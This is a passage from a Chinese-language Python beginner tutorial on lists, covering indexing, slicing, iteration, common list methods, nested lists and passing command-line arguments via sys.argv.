my_str.join(str_list)</span><br><span class="line">Out[<span class="number">8</span>]: <span class="string">&#x27;welcome-to-changsha&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><p>关于字符串的常见操作上面列举了16个，其实还有很多，但各位同学们要注意</p><ol><li>不要背，理解即可</li><li>忘记没关系，可以查阅资料</li><li>学会怎么用，什么时候用什么这是关键点</li></ol><h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><h4 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h4><p>通过前面学习的字符串我们可以实现用它存储一串信息，例如一个人的名字 <code>&quot;顾安&quot;</code>，那么如何存储咱们班所有同学的名字呢？</p><p>定义100个变量，每个变量存放一个学生的姓名可行吗？有更好的办法吗？</p><p>答：列表</p><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>定义列表的方式是<code>[]</code></p><p>如下：用列表存储了3个学生的姓名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stu_names = [<span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;李四&#x27;</span>, <span class="string">&#x27;王五&#x27;</span>]</span><br></pre></td></tr></table></figure><p>如下：用列表存储了5个分数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">scores = [<span class="number">100</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">95</span>, <span class="number">90</span>]</span><br></pre></td></tr></table></figure><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><h5 id="下标-1"><a href="#下标-1" class="headerlink" title="下标"></a>下标</h5><p>列表中存储的多个数据，我们可以对这些数据任意的使用</p><p>方式是：通过下标可以实现定位，然后就可以用这个数据</p><p>例如：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stu_names = [<span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;李四&#x27;</span>, <span class="string">&#x27;王五&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(stu_names[<span class="number">0</span>])  <span class="comment"># 此时只输出张三</span></span><br><span class="line">stu_names[<span class="number">0</span>] = <span class="string">&quot;顾安&quot;</span></span><br><span class="line"><span class="built_in">print</span>(stu_names[<span class="number">0</span>])  <span class="comment"># 此时只输出顾安</span></span><br></pre></td></tr></table></figure><p><strong>注意：下标依然是从0开始使用</strong></p><h5 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h5><p>切片具体的知识我们已经学习过了，在列表也是支持切片操作的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stu_names = [<span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;李四&#x27;</span>, <span class="string">&#x27;王五&#x27;</span>]</span><br><span class="line">stu_names[<span class="number">1</span>:<span class="number">3</span>]  <span class="comment"># 此时得到一个新列表 [李四&#x27;, &#x27;王五&#x27;]</span></span><br></pre></td></tr></table></figure><p>列表逆序：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stu_names = [<span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;李四&#x27;</span>, <span class="string">&#x27;王五&#x27;</span>]</span><br><span class="line">stu_names = [::-<span class="number">1</span>]  <span class="comment"># 得到一个新列表[&#x27;王五&#x27;, &#x27;李四&#x27;, &#x27;张三&#x27;]</span></span><br></pre></td></tr></table></figure><h5 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h5><p>所谓列表遍历，就是指将列表中的所有的数据依次获取打印</p><blockquote><p>方式一：使用for循环 (首选)</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stu_names = [<span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;李四&#x27;</span>, <span class="string">&#x27;王五&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> stu_names:</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">张三</span><br><span class="line">李四</span><br><span class="line">王五</span><br></pre></td></tr></table></figure><blockquote><p>方式二：使用while循环</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stu_names = [<span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;李四&#x27;</span>, <span class="string">&#x27;王五&#x27;</span>]</span><br><span class="line">length = <span class="built_in">len</span>(stu_names)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; length:</span><br><span class="line">    <span class="built_in">print</span>(stu_names[i])</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">张三</span><br><span class="line">李四</span><br><span class="line">王五</span><br></pre></td></tr></table></figure><h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><p>学习其他编程语言的同学，此时能够看到Python中的<code>列表</code>与<code>C语言</code>、<code>C++</code>语言、<code>Java</code>中的<code>数组</code>很类似</p><p><strong>相同点</strong>：列表和数组都能实现多个数据的存储</p><p><strong>不同点</strong>：<u>列表可以存储不同类似的数据，而数组只能存储相同数据类型。</u></p><p>如下代码，完成了一个列表存储了多个信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">teacher = [<span class="string">&quot;顾安&quot;</span>, <span class="string">&quot;湖南省长沙市&quot;</span>, <span class="number">18</span>, <span class="number">176.5</span>]  <span class="comment"># 18为年龄，176.5为身高</span></span><br></pre></td></tr></table></figure><p><strong>技巧</strong>：虽然Python中的列表可以存储多个不同的数据类型，但一般情况下我们很少这么做，而是把数据类型相同的数据放到一个列表，这样操作时会更加方便，否则就会出现一会整数，一会字符串很容易出错</p><p>如果真的需要存储多个数据，例如一个人的信息由多个组成，此时一般用Python中的<strong>字典</strong>来进行存储</p><h1 id="列表的相关操作"><a href="#列表的相关操作" class="headerlink" title="列表的相关操作"></a>列表的相关操作</h1><p>列表，最大的特点能够存储多个数据，一般情况下我们需要对这个列表进行数据的增删改查，详细功能如下</p><h2 id="数据增加（append、extend、insert）"><a href="#数据增加（append、extend、insert）" class="headerlink" title="数据增加（append、extend、insert）"></a>数据增加（append、extend、insert）</h2><blockquote><p>append 方法</p></blockquote><p>通过<code>append</code>可以向列表添加元素</p><p>格式：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">列表.append(新元素数据)</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义列个表存储3个学生的姓名</span></span><br><span class="line">stu_names = [<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;李四&#x27;</span>,<span class="string">&#x27;王五&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-----添加之前，列表的数据-----&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> stu_names:</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提示、并添加元素</span></span><br><span class="line">temp = <span class="built_in">input</span>(<span class="string">&#x27;请输入要添加的学生姓名:&#x27;</span>)</span><br><span class="line">stu_names.append(temp)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-----添加之后，列表的数据-----&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> stu_names:</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure><blockquote><p>extend 方法</p></blockquote><p>通过<code>extend</code>可以将另一个列表中的元素逐一添加到列表中，</p><p>格式：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">列表.extend(另外一个列表)</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.append(b)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, [<span class="number">3</span>, <span class="number">4</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.extend(b)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, [<span class="number">3</span>, <span class="number">4</span>], <span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><blockquote><ol><li>extend是在原列表基础上进行扩展，下面这个例子，是通过加号将两个列表拼接，然后赋值给一个新的变量~~</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">b = [<span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">c = a + b</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><ol start="2"><li><p><strong>extend可以在后面拓展一个任意序列类型</strong>，不论是列表还是元组，还是字符串，还是集合~~都可以使用extend进行拼接~</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">a.extend((<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>))</span><br></pre></td></tr></table></figure></li></ol></blockquote><blockquote><p>insert 方法</p></blockquote><p><code>insert(index, object)</code>在指定位置<code>index（索引，理解为下标即可）</code>前插入元素<code>object</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.insert(<span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br></pre></td></tr></table></figure><h2 id="数据修改"><a href="#数据修改" class="headerlink" title="数据修改"></a>数据修改</h2><p>修改元素的时候，要通过下标来确定要修改的是哪个元素，然后才能进行修改</p><p>格式：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">列表[下标] = 新数据</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义列个表存储3个学生的姓名</span></span><br><span class="line">stu_names = [<span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;李四&#x27;</span>, <span class="string">&#x27;王五&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-----修改之前，列表的数据-----&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> stu_names:</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改元素</span></span><br><span class="line">stu_names[<span class="number">1</span>] = <span class="string">&#x27;赵六&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-----修改之后，列表的数据-----&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> stu_names:</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure><h2 id="数据查询（in、not-in、count、index）"><a href="#数据查询（in、not-in、count、index）" class="headerlink" title="数据查询（in、not in、count、index）"></a>数据查询（in、not in、count、index）</h2><p>所谓的查找，就是看看指定的元素是否存在</p><blockquote><p>in、not in 查询列表中的元素是否存在</p></blockquote><p>查找的常用方法为：</p><ul><li>in（存在），如果存在那么结果为<code>true</code>，否则为<code>false</code></li><li>not in（不存在），如果不存在那么结果为<code>true</code>，否则<code>false</code></li></ul><p><code>in</code>格式：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">数据 <span class="keyword">in</span> 列表</span><br></pre></td></tr></table></figure><p><code>not in</code> 格式：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">数据 <span class="keyword">not</span> <span class="keyword">in</span> 列表</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 待查找的列表</span></span><br><span class="line">stu_names = [<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;李四&#x27;</span>,<span class="string">&#x27;王五&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取用户要查找的名字</span></span><br><span class="line">find_name = <span class="built_in">input</span>(<span class="string">&#x27;请输入要查找的姓名:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找是否存在</span></span><br><span class="line"><span class="keyword">if</span> find_name <span class="keyword">in</span> stu_names:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;找到了名字&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;没有找到&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>count 查询元素个数</p></blockquote><p>格式：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">列表.count(<span class="string">&quot;要查询的数据&quot;</span>)  <span class="comment"># 结果就是找到的数据的个数</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">5</span>]: nums = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: nums.count(<span class="number">1</span>)  <span class="comment"># 查找的数据1 一共有2个，所以结果为2</span></span><br><span class="line">Out[<span class="number">6</span>]: <span class="number">2</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: nums.count(<span class="number">9</span>)  <span class="comment"># 没有找到数据9 所以结果为0</span></span><br><span class="line">Out[<span class="number">7</span>]: <span class="number">0</span></span><br></pre></td></tr></table></figure><blockquote><p>index 返回元素索引</p></blockquote><p>格式：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">列表.index(<span class="string">&quot;value&quot;</span>)  <span class="comment"># 结果就是找到的数据的索引</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1=[<span class="string">&#x27;安琪拉&#x27;</span>,<span class="string">&#x27;妲己&#x27;</span>,<span class="string">&#x27;韩信&#x27;</span>,<span class="string">&#x27;典韦&#x27;</span>,<span class="string">&#x27;吕布&#x27;</span>]</span><br><span class="line">list1.index(<span class="string">&#x27;妲己&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="数据删除（del、pop、remove）"><a href="#数据删除（del、pop、remove）" class="headerlink" title="数据删除（del、pop、remove）"></a>数据删除（del、pop、remove）</h2><p>列表元素的常用删除方法有：</p><ul><li><code>del</code>：根据下标进行删除，del也可以删除变量</li><li><code>pop</code>：删除最后一个元素</li><li><code>remove</code>：根据元素的值进行删除</li></ul><blockquote><p>del</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">movie_names = [<span class="string">&#x27;加勒比海盗&#x27;</span>, <span class="string">&#x27;骇客帝国&#x27;</span>, <span class="string">&#x27;第一滴血&#x27;</span>, <span class="string">&#x27;指环王&#x27;</span>, <span class="string">&#x27;霍比特人&#x27;</span>, <span class="string">&#x27;速度与激情&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------删除之前------&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> movie_names:</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> movie_names[<span class="number">2</span>]  <span class="comment"># 这里根据下标进行删除</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------删除之后------&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> movie_names:</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure><blockquote><p>pop</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list_name.pop(index)</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">movie_names = [<span class="string">&#x27;加勒比海盗&#x27;</span>, <span class="string">&#x27;骇客帝国&#x27;</span>, <span class="string">&#x27;第一滴血&#x27;</span>, <span class="string">&#x27;指环王&#x27;</span>, <span class="string">&#x27;霍比特人&#x27;</span>, <span class="string">&#x27;速度与激情&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------删除之前------&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> movie_names:</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line">movie_names.pop()  <span class="comment"># 删除最后1个</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------删除之后------&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> movie_names:</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure><blockquote><p>remove</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">movie_names = [<span class="string">&#x27;加勒比海盗&#x27;</span>, <span class="string">&#x27;骇客帝国&#x27;</span>, <span class="string">&#x27;第一滴血&#x27;</span>, <span class="string">&#x27;指环王&#x27;</span>, <span class="string">&#x27;霍比特人&#x27;</span>, <span class="string">&#x27;速度与激情&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------删除之前------&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> movie_names:</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line">movie_names.remove(<span class="string">&#x27;指环王&#x27;</span>)  <span class="comment"># 删除指定的数据</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------删除之后------&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> movie_names:</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure><h2 id="数据排序（sort、reverse）"><a href="#数据排序（sort、reverse）" class="headerlink" title="数据排序（sort、reverse）"></a>数据排序（sort、reverse）</h2><h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><blockquote><p>按升序排序，返回None。如果给定了键函数，则将其应用于每个列表项一次，并根据它们的函数值对它们进行升序或降序排序。reverse可以设置为按降序排序。</p><p>原型：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sort(*, key=<span class="literal">None</span>, reverse=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>此方法会对列表进行原地排序，只使用 <code>&lt;</code> 来进行各项间比较。 异常不会被屏蔽 —— 如果有任何比较操作失败，整个排序操作将失败（而列表可能会处于被部分修改的状态）。</p><p><a href="#list.sort"><code>sort()</code></a> 接受两个仅限以关键字形式传入的参数 (<a href="https://docs.python.org/zh-cn/3.8/glossary.html#keyword-only-parameter">仅限关键字参数</a>):</p><blockquote><p><em>key</em> 指定带有<strong>一个参数的函数(zhu</strong>，用于从每个列表元素中提取比较键 (例如 <code>key=str.lower</code>)。 对应于列表中每一项的键会被计算一次，然后在整个排序过程中使用。 默认值 <code>None</code> 表示直接对列表项排序而不计算一个单独的键值。</p><p>可以使用 <a href="functools.html#functools.cmp_to_key"><code>functools.cmp_to_key()</code></a> 将 2.x 风格的 <em>cmp</em> 函数转换为 <em>key</em> 函数。</p></blockquote><blockquote><p><em>reverse</em> 为一个布尔值。 如果设为 <code>True</code>，则每个列表元素将按反向顺序比较进行排序。</p><p>当顺序大尺寸序列时此方法会原地修改该序列以保证空间经济性。 为提醒用户此操作是通过间接影响进行的，它并不会返回排序后的序列（请使用 <a href="functions.html#sorted"><code>sorted()</code></a> 显示地请求一个新的已排序列表实例）。</p></blockquote><p><a href="#list.sort"><code>sort()</code></a> 方法确保是稳定的。 如果一个排序确保不会改变比较结果相等的元素的相对顺序就称其为稳定的 — 这有利于进行多重排序（例如先按部门、再接薪级排序）。</p><p>有关排序示例和简要排序教程，请参阅 <a href="https://docs.python.org/zh-cn/3.8/howto/sorting.html#sortinghowto">排序指南</a> 。</p><p><strong>CPython implementation detail:</strong> 在一个列表被排序期间，尝试改变甚至进行检测也会造成未定义的影响。 Python 的 C 实现会在排序期间将列表显示为空，如果发现列表在排序期间被改变将会引发 <a href="exceptions.html#ValueError"><code>ValueError</code></a>。</p></blockquote><blockquote><p>sort方法的key不容易理解，主要是<strong>sort可以自定义排序方式，排序方式一般使用函数确定，更多的时候我们使用匿名函数定义这种排序方式</strong></p><p>sort()函数中参数key的意思：</p><p><strong>传递给key参数的是一个函数，它指定可迭代对象中的每一个元素来按照该函数进行排序</strong></p><p>这是一个简单易懂的例子</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">strings = [<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;card&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="string">&#x27;abab&#x27;</span>]</span><br><span class="line"><span class="comment"># 根据字符串中不同字母的数量对一个字符串集合进行排序</span></span><br><span class="line">strings.sort(key=<span class="keyword">lambda</span> x: <span class="built_in">len</span>(<span class="built_in">set</span>(<span class="built_in">list</span>(x))))</span><br></pre></td></tr></table></figure></blockquote><p>sort方法是将列表按特定顺序重新排列，默认为由小到大，参数<code>reverse=True</code>可改为倒序，由大到小。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.sort()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure><h3 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h3><p>reverse方法是将列表倒叙</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.reverse()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure><h1 id="列表嵌套"><a href="#列表嵌套" class="headerlink" title="列表嵌套"></a>列表嵌套</h1><h5 id="什么是列表嵌套"><a href="#什么是列表嵌套" class="headerlink" title="什么是列表嵌套"></a>什么是列表嵌套</h5><p>类似while循环的嵌套，列表也是支持嵌套的</p><p>一个列表中的元素又是一个列表，那么这就是列表的嵌套</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">school_names = [</span><br><span class="line">    [<span class="string">&#x27;北京大学&#x27;</span>, <span class="string">&#x27;清华大学&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;南开大学&#x27;</span>, <span class="string">&#x27;天津大学&#x27;</span>, <span class="string">&#x27;天津师范大学&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;山东大学&#x27;</span>, <span class="string">&#x27;中国海洋大学&#x27;</span>]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h5 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h5><p>一个学校，有3个办公室，现在有8位老师等待工位的分配，请编写程序，完成随机的分配</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个列表用来保存3个办公室</span></span><br><span class="line">offices = [[], [], []]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个列表用来存储8位老师的名字</span></span><br><span class="line">names = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历所有的老师，随机安排到0、1、2号办公室</span></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">    random_num = random.randint(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">    offices[random_num].append(name)</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> office_names <span class="keyword">in</span> offices:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;办公室%d的人数为:%d&#x27;</span> % (i, <span class="built_in">len</span>(office_names)))</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> office_names:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s&quot;</span> % name, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">20</span>)</span><br></pre></td></tr></table></figure><p>运行结果如下: (因为是随机 所以每次运行结果都可以不同)</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">办公室1的人数为:1</span><br><span class="line">G </span><br><span class="line"></span><br><span class="line">--------------------</span><br><span class="line">办公室2的人数为:2</span><br><span class="line">A B </span><br><span class="line"></span><br><span class="line">--------------------</span><br><span class="line">办公室3的人数为:5</span><br><span class="line">C D E F H </span><br></pre></td></tr></table></figure><h1 id="给程序传递参数"><a href="#给程序传递参数" class="headerlink" title="给程序传递参数"></a>给程序传递参数</h1><h5 id="引入-1"><a href="#引入-1" class="headerlink" title="引入"></a>引入</h5><p>当我们在终端中运行一个程序的时候，往往可以多写一些数据，例如Linux下的<code>ping</code>，可以加上<code>ip地址</code>，这样就可以对测试是否能够联通对方</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping 192.168.65.232</span><br></pre></td></tr></table></figure><p>所谓给程序传参数，就如同上述的<code>ping</code>程序一样，程序是早就写好了的固定的，我们可以在运行的时候给这个程序一个<code>ip地址</code>，这样在程序不改变的情况下，实现通用。</p><h5 id="Python-程序的运行"><a href="#Python-程序的运行" class="headerlink" title="Python 程序的运行"></a>Python 程序的运行</h5><p>在前面的学习中，我们一直在pycharm或者用python交互模式进行的，实际上还可以将编写好的<code>.py</code>文件用终端的方式进行运行</p><p>步骤1：编写一个简单的代码，然后将文件命名为<code>test.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我是顾安&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;欢迎大家学习python开发&quot;</span>)</span><br></pre></td></tr></table></figure><p>步骤2：打开终端，并在终端中找到<code>test.py</code>这个文件</p><p>步骤3：使用<code>python</code>命令运行<code>test.py</code>文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python test.py</span><br></pre></td></tr></table></figure><h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><ul><li>可以用pycharm编写代码运行代码，几乎都是图形化操作，操作简单；适合较大代码量的软件开发</li><li>可以用Python交互模式调试代码；适合简单的调试运行</li><li>可以用任意编辑器编写代码，然后保存为<code>.py</code>文件，最后在终端中用命令执行；适合简单的代码</li><li>python.exe程序传入的参数中，第一个参数是文件名在索引0的位置，<code>sys.argv[0]=filename</code>，之后才是其他参数</li></ul><h5 id="给-Python-程序传递参数"><a href="#给-Python-程序传递参数" class="headerlink" title="给 Python 程序传递参数"></a>给 Python 程序传递参数</h5><p>在用<code>python3 xxxx.py</code>方式运行python程序时，可以给这个将要运行的程序传递数据，这样既可以不用修改代码，还能够实现不同参数对应不同的功能。</p><blockquote><p>使用方式</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sys.argv  <span class="comment"># sys.argv就是一个列表，这个列表中存储着运行时传递的参数，注意全部是字符串</span></span><br></pre></td></tr></table></figure><blockquote><p>代码示例</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">data_len = <span class="built_in">len</span>(sys.argv)</span><br><span class="line"><span class="keyword">while</span> i &lt; data_len:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;argv[%d]=%s&quot;</span> % (i, sys.argv[i]))</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#或者这样写    